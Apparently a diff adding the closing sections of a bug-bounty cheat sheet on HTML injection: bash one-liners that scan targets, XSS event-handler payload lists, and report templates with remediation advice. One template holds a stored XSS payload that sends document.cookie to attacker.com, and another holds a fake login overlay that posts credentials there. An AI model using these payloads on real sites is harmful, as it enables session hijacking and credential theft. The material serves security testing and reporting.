+<!-- ==================== SECTION 9 ==================== -->
+<div class="section" id="s9">
+<h1>9. One-Liners</h1>
+
+<div class="dork">
+  <div class="dork-title">Mass HTML Injection Detection</div>
+  <pre># Find reflected parameters and test HTML injection
+cat urls.txt | kxss | grep "Reflection" | awk '{print $1}' | \
+  while read url; do
+    test_url=$(echo "$url" | sed 's/=\(.*\)/=<b>HTML_INJECTION_TEST<\/b>/')
+    resp=$(curl -s --max-time 10 "$test_url" 2>/dev/null)
+    if echo "$resp" | grep -qi "HTML_INJECTION_TEST"; then
+      echo "[!] HTML Injection: $test_url"
+    fi
+  done | tee html_injection_finds.txt</pre>
+  <div class="dork-tags"><span class="badge b-active">Active</span> <span class="badge b-tool">kxss</span> <span class="badge b-tool">curl</span></div>
+</div>
+
+<div class="dork">
+  <div class="dork-title">Stored HTML Injection Scanner</div>
+  <pre># Test all POST endpoints for stored HTML injection
+cat endpoints.txt | while read endpoint; do
+  for param in bio description comment message content body text note title; do
+    resp=$(curl -s -X POST "$endpoint" \
+      -H "Content-Type: application/x-www-form-urlencoded" \
+      -H "Cookie: session=VALID" \
+      -d "${param}=<b>STORED_HTML_TEST</b>" 2>/dev/null)
+    if echo "$resp" | grep -qi "STORED_HTML_TEST"; then
+      echo "[!] Stored HTML: $endpoint param=$param"
+    fi
+  done
+done</pre>
+  <div class="dork-tags"><span class="badge b-active">Active</span> <span class="badge b-tool">bash</span></div>
+</div>
+
+<div class="dork">
+  <div class="dork-title">DOM-Based HTML Injection Detection</div>
+  <pre># Find JS sinks in target JavaScript
+echo "target.com" | getJS | while read js; do
+  echo "=== $js ==="
+  curl -s "$js" | grep -oE "(innerHTML|outerHTML|insertAdjacentHTML|document\.write|\.html\(|dangerouslySetInnerHTML|v-html|ng-bind-html)" | sort | uniq -c
+done
+
+# Test hash-based DOM injection in browser:
+# https://target.com/app#<h1>DOM_TEST</h1>
+# Check DevTools Elements tab for rendered HTML</pre>
+  <div class="dork-tags"><span class="badge b-passive">Passive</span> <span class="badge b-tool">getJS</span></div>
+</div>
+
+<div class="dork">
+  <div class="dork-title">HTML to XSS Escalation Tester</div>
+  <pre># Test all event handlers on a vulnerable parameter
+for payload in "<img src=x onerror=alert(1)>" \
+               "<svg onload=alert(1)>" \
+               "<details open ontoggle=alert(1)>" \
+               "<input onfocus=alert(1) autofocus>" \
+               "<iframe src=javascript:alert(1)>" \
+               "<audio src=x onerror=alert(1)>" \
+               "<body onload=alert(1)>" \
+               "<marquee onstart=alert(1)>test</marquee>"; do
+  encoded=$(echo "$payload" | python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read().strip()))")
+  resp=$(curl -s "https://target.com/page?msg=${encoded}" 2>/dev/null)
+  if echo "$resp" | grep -qoi "alert(1)"; then
+    echo "[!] XSS via: $payload"
+  fi
+done</pre>
+  <div class="dork-tags"><span class="badge b-active">Active</span> <span class="badge b-tool">bash</span></div>
+</div>
+
+</div>
+
+<!-- ==================== SECTION 10 ==================== -->
+<div class="section" id="s10">
+<h1>10. Report Templates</h1>
+
+<div class="report-box">
+  <div class="report-title">Report Template: Reflected HTML Injection</div>
+  <pre><strong>Title:</strong> Reflected HTML Injection on Search Endpoint
+<strong>Severity:</strong> Medium (P3)
+<strong>Endpoint:</strong> https://target.com/search?q=&lt;payload&gt;
+
+<strong>Summary:</strong>
+The search endpoint reflects user input without HTML encoding,
+allowing attackers to inject arbitrary HTML markup. This can be
+used for phishing, defacement, and UI manipulation.
+
+<strong>Steps to Reproduce:</strong>
+1. Visit: https://target.com/search?q=&lt;h1&gt;Account Suspended&lt;/h1&gt;
+2. Observe the injected HTML renders on the page
+3. The heading "Account Suspended" appears as real page content
+
+<strong>Impact:</strong>
+- Phishing attacks via crafted URLs
+- Defacement of page content
+- Social engineering under trusted domain
+- Potential escalation to XSS if event handlers are allowed
+
+<strong>Remediation:</strong>
+1. HTML-encode all user input before rendering:
+   &lt; → &amp;lt;
+   &gt; → &amp;gt;
+   " → &amp;quot;
+   ' → &amp;#x27;
+2. Use a templating engine with auto-escaping (Jinja2, Razor)
+3. Implement Content Security Policy
+4. Validate and sanitize input on both client and server
+
+<strong>CVSS:</strong> 6.1 (Medium)</pre>
+</div>
+
+<div class="report-box">
+  <div class="report-title">Report Template: Stored HTML Injection</div>
+  <pre><strong>Title:</strong> Stored HTML Injection in User Profile Bio
+<strong>Severity:</strong> High (P2)
+<strong>Endpoint:</strong> https://target.com/api/profile (POST) / https://target.com/user/:id (GET)
+
+<strong>Summary:</strong>
+The user profile bio field accepts and stores HTML content without
+sanitization. When other users view the profile, the injected HTML
+renders in their browser, enabling persistent phishing and
+defacement for all visitors.
+
+<strong>Steps to Reproduce:</strong>
+1. POST to update bio:
+   curl -X POST https://target.com/api/profile \
+     -H "Cookie: session=VALID" \
+     -d '{"bio": "&lt;div style=position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:99999;&gt;&lt;h1&gt;HACKED&lt;/h1&gt;&lt;/div&gt;"}'
+
+2. Visit profile page: https://target.com/user/attacker-id
+3. Full-screen defacement appears for ALL visitors
+
+<strong>Impact:</strong>
+- Persistent defacement affecting all users
+- Phishing via fake login forms in profiles
+- Reputation damage
+- Trust erosion
+- Chainable to XSS if event handlers allowed
+
+<strong>Remediation:</strong>
+1. Strip HTML tags or use a whitelist (DOMPurify)
+2. Convert to plain text before storage
+3. Use Markdown with sanitized rendering
+4. Validate output encoding in all contexts
+
+<strong>CVSS:</strong> 7.1 (High)</pre>
+</div>
+
+<div class="report-box">
+  <div class="report-title">Report Template: DOM-Based HTML Injection</div>
+  <pre><strong>Title:</strong> DOM-Based HTML Injection via URL Fragment
+<strong>Severity:</strong> High (P2)
+<strong>Endpoint:</strong> https://target.com/app#&lt;payload&gt;
+
+<strong>Summary:</strong>
+The single-page application reads URL fragment (location.hash) and
+writes it to the DOM using innerHTML without sanitization. Since
+the fragment is not sent to the server, server-side filters do not
+protect against this vulnerability.
+
+<strong>Steps to Reproduce:</strong>
+1. Visit: https://target.com/app#&lt;h1&gt;Injected&lt;/h1&gt;
+2. Open browser DevTools and inspect the DOM
+3. Observe &lt;h1&gt;Injected&lt;/h1&gt; rendered in the page
+
+4. Escalate to fake login form:
+   https://target.com/app#&lt;div style=position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999;&gt;&lt;h2&gt;Session Expired&lt;/h2&gt;&lt;form action=https://attacker.com&gt;&lt;input placeholder=email&gt;&lt;input type=password placeholder=password&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;
+
+<strong>Impact:</strong>
+- Client-side phishing via shared links
+- Credential harvesting
+- UI manipulation
+- All server-side protections bypassed
+
+<strong>Remediation:</strong>
+1. Use textContent instead of innerHTML for user input
+2. If HTML is needed, use DOMPurify to sanitize
+3. Validate and whitelist allowed tags
+4. Implement CSP to mitigate impact
+
+<strong>CVSS:</strong> 7.1 (High)</pre>
+</div>
+
+<div class="report-box">
+  <div class="report-title">Report Template: HTML Injection Escalated to XSS</div>
+  <pre><strong>Title:</strong> Stored HTML Injection Escalated to XSS via Profile Bio
+<strong>Severity:</strong> Critical (P1)
+<strong>Endpoint:</strong> https://target.com/api/profile
+
+<strong>Summary:</strong>
+The profile bio field allows stored HTML injection. Further testing
+revealed that event handlers are not filtered, allowing stored XSS
+that executes in every visitor's browser.
+
+<strong>Steps to Reproduce:</strong>
+1. POST malicious bio:
+   curl -X POST https://target.com/api/profile \
+     -H "Cookie: session=VALID" \
+     -d '{"bio": "&lt;img src=x onerror=fetch(\x27https://attacker.com/?c=\x27+document.cookie)&gt;"}'
+
+2. Any user viewing the profile has their session cookie stolen
+3. Attacker receives cookie at https://attacker.com/
+
+<strong>Impact:</strong>
+- Session hijacking for all profile visitors
+- Account takeover
+- Persistent XSS affecting all users
+- Potential for worm-like propagation
+
+<strong>Remediation:</strong>
+1. Use DOMPurify with strict config (no event handlers)
+2. Output encode: &lt; → &amp;lt; &gt; → &amp;gt;
+3. Use textContent instead of innerHTML
+4. Implement strict CSP: script-src 'self'
+5. Use HttpOnly, Secure, SameSite cookies
+
+<strong>CVSS:</strong> 9.6 (Critical)</pre>
+</div>
+
+</div>
+
+<!-- ==================== SECTION 11 ==================== -->
+<div class="section" id="s11">
+<h1>11. Tips &amp; Tricks</h1>
+
+<div class="tip">
+  <div class="call-title">Tip 1: Test All Output Contexts</div>
+  HTML injection behaves differently depending on context: between tags, inside attributes, inside URLs, inside style blocks, inside scripts, inside comments. Always test all contexts for comprehensive coverage.
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 2: Look for InnerHTML in JavaScript</div>
+  DOM-based HTML injection is invisible to server-side scanners. Always grep for innerHTML, outerHTML, insertAdjacentHTML, jQuery html(), and dangerouslySetInnerHTML in JavaScript files.
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 3: Escalate Every HTML Injection to XSS</div>
+  Even if basic tags work, always test event handlers. An HTML injection that allows &lt;img onerror&gt; is stored XSS - a Critical finding. Don't stop at "just HTML."
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 4: Check Email and PDF Rendering</div>
+  Some applications send user input in emails or generate PDFs. HTML in email subjects/bodies or PDF templates can enable phishing outside the web application.
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 5: Test After Every Encoding Layer</div>
+  If input is URL-decoded, then HTML-decoded, then rendered, you may need double-encoded payloads. Test: %253C (URL-encoded &lt;), &amp;lt; (HTML entity), Unicode variants.
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 6: Stored Injection Affects More Users</div>
+  Reflected HTML injection requires a victim to click a link. Stored injection affects every user who views the content. Always prioritize finding stored injection points - they yield higher bounties.
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 7: Create Convincing PoCs</div>
+  A fake login form or security alert overlay is far more impactful than a bold heading. Create realistic phishing PoCs to demonstrate real-world impact to triagers.
+</div>
+
+<div class="tip">
+  <div class="call-title">Tip 8: Check Mobile App WebViews</div>
+  Mobile apps often use WebView to display web content. If the app displays user-generated content without sanitization, HTML injection in the app can have wider impact than browser-only exploitation.
+</div>
+
+<div class="warn">
+  <div class="call-title">Responsible Disclosure</div>
+  When demonstrating stored HTML injection, inject only on your own test account. Never inject content that other users will see before the report is acknowledged. If you must demonstrate stored impact, use obvious test markers like &lt;b&gt;TEST-HTML-INJECTION&lt;/b&gt; rather than realistic phishing content.
+</div>
+
+<table style="margin-top: 20px;">
+<thead><tr><th>Resource</th><th>URL</th></tr></thead>
+<tbody>
+<tr><td>OWASP HTML Injection</td><td>https://owasp.org/www-community/attacks/HTML_Injection</td></tr>
+<tr><td>PortSwigger XSS</td><td>https://portswigger.net/web-security/cross-site-scripting</td></tr>
+<tr><td>DOMPurify</td><td>https://github.com/cure53/DOMPurify</td></tr>
+<tr><td>HTML5 Security Cheatsheet</td><td>https://html5sec.org/</td></tr>
+<tr><td>PayloadAllTheThings</td><td>https://github.com/swisskyrepo/PayloadsAllTheThings</td></tr>
+<tr><td>XSS Hunter</td><td>https://xsshunter.com/</td></tr>
+</tbody>
+</table>
+
+</div>
+
+</body>
+</html>
